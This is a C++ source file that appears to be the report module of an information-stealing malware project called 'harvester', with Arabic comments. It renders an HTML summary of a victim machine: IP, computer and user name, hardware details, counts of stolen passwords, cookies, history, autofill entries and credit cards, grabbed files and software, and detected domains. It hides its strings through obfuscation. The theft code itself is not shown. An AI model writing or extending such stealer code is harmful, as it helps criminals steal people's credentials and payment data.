// harvester/report/report_builder.cpp
#include "report_builder.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>

static std::string escapeHtml(const std::string& s) {
    std::string result;
    for (char c : s) {
        if (c == '<') result += "&lt;";
        else if (c == '>') result += "&gt;";
        else if (c == '&') result += "&amp;";
        else if (c == '"') result += "&quot;";
        else result += c;
    }
    return result;
}

void BuildReport(const SystemInfo& sysInfo,
                 const std::vector<DetectedApp>& detectedApps,
                 const CollectedStats& stats,
                 const std::string& outputDir) {
    std::string reportPath = outputDir + "\\" + GetObfuscatedString(STR_REPORT_HTML); // "report.html"
    std::ofstream out(reportPath);
    if (!out.is_open()) return;

    // ===== الحصول على وقت التقرير =====
    SYSTEMTIME st;
    GetLocalTime(&st);
    char timestamp[64];
    snprintf(timestamp, sizeof(timestamp),
             "%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);

    // ===== HTML + CSS محسَّن =====
    out << "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">";
    out << "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
    out << "<title>System Report</title>";
    out << "<style>";
    // --- متغيرات الألوان ---
    out << ":root{"
           "--bg:#0f0f1a;--surface:#1a1a2e;--card:#16213e;--border:#0f3460;"
           "--accent:#e94560;--accent2:#533483;--text:#e0e0ff;--muted:#8888aa;"
           "--green:#00d4aa;--red:#ff4757;--blue:#70a1ff;"
           "}";
    // --- أساسيات ---
    out << "*{box-sizing:border-box;margin:0;padding:0;}";
    out << "body{font-family:'Segoe UI',Consolas,monospace;background:var(--bg);"
           "color:var(--text);padding:24px;min-height:100vh;"
           "background-image:radial-gradient(ellipse at top left,#1a1a3e 0%,var(--bg) 60%);}";
    // --- رأس الصفحة ---
    out << ".header{background:linear-gradient(135deg,var(--accent2),var(--accent));"
           "border-radius:12px;padding:20px 24px;margin-bottom:24px;"
           "display:flex;justify-content:space-between;align-items:center;"
           "box-shadow:0 4px 20px rgba(233,69,96,0.3);}";
    out << ".header h1{font-size:1.4rem;font-weight:700;letter-spacing:1px;color:#fff;}";
    out << ".header .ts{font-size:0.78rem;color:rgba(255,255,255,0.75);font-family:Consolas,monospace;}";
    // --- بطاقات الأقسام ---
    out << ".section{background:var(--card);border:1px solid var(--border);"
           "border-radius:10px;padding:0;margin-bottom:20px;"
           "box-shadow:0 2px 12px rgba(0,0,0,0.4);overflow:hidden;}";
    out << ".section-title{background:var(--surface);padding:12px 18px;"
           "font-size:0.9rem;font-weight:600;color:var(--blue);"
           "letter-spacing:0.5px;border-bottom:1px solid var(--border);"
           "text-transform:uppercase;}";
    // --- جداول ---
    out << "table{width:100%;border-collapse:collapse;}";
    out << "tr{transition:background 0.15s ease;}";
    out << "tr:hover{background:rgba(112,161,255,0.07);}";
    out << "th,td{padding:10px 18px;text-align:left;border-bottom:1px solid var(--border);font-size:0.88rem;}";
    out << "th{color:var(--muted);font-weight:500;width:35%;}";
    out << "td{color:var(--text);}";
    out << "tr:last-child th,tr:last-child td{border-bottom:none;}";
    // --- قوائم التطبيقات ---
    out << "ul{list-style:none;padding:12px 18px;}";
    out << "li{padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);"
           "display:flex;align-items:center;gap:10px;font-size:0.88rem;}";
    out << "li:last-child{border-bottom:none;}";
    // --- شارات الحالة ---
    out << ".badge-found{background:rgba(0,212,170,0.15);color:var(--green);"
           "border:1px solid var(--green);padding:2px 8px;border-radius:20px;"
           "font-size:0.75rem;font-weight:600;}";
    out << ".badge-missing{background:rgba(255,71,87,0.15);color:var(--red);"
           "border:1px solid var(--red);padding:2px 8px;border-radius:20px;"
           "font-size:0.75rem;font-weight:600;}";
    out << ".dot-found{width:8px;height:8px;border-radius:50%;background:var(--green);flex-shrink:0;}";
    out << ".dot-missing{width:8px;height:8px;border-radius:50%;background:var(--red);flex-shrink:0;}";
    out << ".app-name{flex:1;}";
    out << "</style></head><body>";

    // ===== رأس التقرير =====
    out << "<div class=\"header\">";
    out << "<h1>&#128196; " << GetObfuscatedString(STR_PC_USER_INFORMATION) << "</h1>";
    out << "<span class=\"ts\">Generated: " << timestamp << "</span>";
    out << "</div>";

    // ===== قسم معلومات النظام =====
    out << "<div class=\"section\">";
    out << "<div class=\"section-title\">&#128187; " << GetObfuscatedString(STR_PC_USER_INFORMATION) << "</div>";
    out << "<table>";
    out << "<tr><th>" << GetObfuscatedString(STR_IP_ADDRESS)    << "</th><td>" << escapeHtml(sysInfo.ipAddress)    << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_COMPUTER_NAME) << "</th><td>" << escapeHtml(sysInfo.computerName) << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_USER_NAME)     << "</th><td>" << escapeHtml(sysInfo.userName)     << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_OS_VERSION)    << "</th><td>" << escapeHtml(sysInfo.osVersion)    << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_ARCHITECTURE)  << "</th><td>" << escapeHtml(sysInfo.architecture) << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_RAM)           << "</th><td>" << escapeHtml(sysInfo.ram)          << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_CPU)           << "</th><td>" << escapeHtml(sysInfo.cpu)          << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_GPU)           << "</th><td>" << escapeHtml(sysInfo.gpu)          << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_LANGUAGE)      << "</th><td>" << escapeHtml(sysInfo.language)     << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_TIMEZONE)      << "</th><td>" << escapeHtml(sysInfo.timezone)     << "</td></tr>";
    out << "</table></div>";

    // ===== قسم الإحصائيات =====
    out << "<div class=\"section\">";
    out << "<div class=\"section-title\">&#128202; " << GetObfuscatedString(STR_BASIC_INFORMATION) << "</div>";
    out << "<table>";
    out << "<tr><th>" << GetObfuscatedString(STR_PASSWORDS_COUNT)    << "</th><td>" << stats.passwordsCount    << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_COOKIES_COUNT)      << "</th><td>" << stats.cookiesCount      << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_HISTORY_COUNT)      << "</th><td>" << stats.historyCount      << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_AUTOFILLS_COUNT)    << "</th><td>" << stats.autofillsCount    << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_CC_COUNT)           << "</th><td>" << stats.creditCardsCount  << "</td></tr>";
    out << "<tr><th>" << GetObfuscatedString(STR_GRABBED_FILES_COUNT)<< "</th><td>" << stats.grabbedFilesCount << "</td></tr>";
    out << "</table></div>";

    // ===== قسم التطبيقات المكتشفة =====
    out << "<div class=\"section\">";
    out << "<div class=\"section-title\">&#128270; " << GetObfuscatedString(STR_GRABBED_SOFTWARE) << "</div>";
    out << "<ul>";
    for (const auto& app : detectedApps) {
        if (app.found) {
            out << "<li>"
                << "<span class=\"dot-found\"></span>"
                << "<span class=\"app-name\">" << escapeHtml(app.name) << "</span>"
                << "<span class=\"badge-found\">FOUND</span>"
                << "</li>";
        } else {
            out << "<li>"
                << "<span class=\"dot-missing\"></span>"
                << "<span class=\"app-name\">" << escapeHtml(app.name) << "</span>"
                << "<span class=\"badge-missing\">NOT FOUND</span>"
                << "</li>";
        }
    }
    out << "</ul></div>";

    // ===== قسم النطاقات =====
    if (!stats.domains.empty()) {
        out << "<div class=\"section\">";
        out << "<div class=\"section-title\">&#127760; " << GetObfuscatedString(STR_DOMAINS_DETECTED) << "</div>";
        out << "<ul>";
        for (const auto& domain : stats.domains) {
            out << "<li>"
                << "<span class=\"dot-found\"></span>"
                << "<span class=\"app-name\">" << escapeHtml(domain) << "</span>"
                << "</li>";
        }
        out << "</ul></div>";
    }

    out << "</body></html>";
    out.close();
}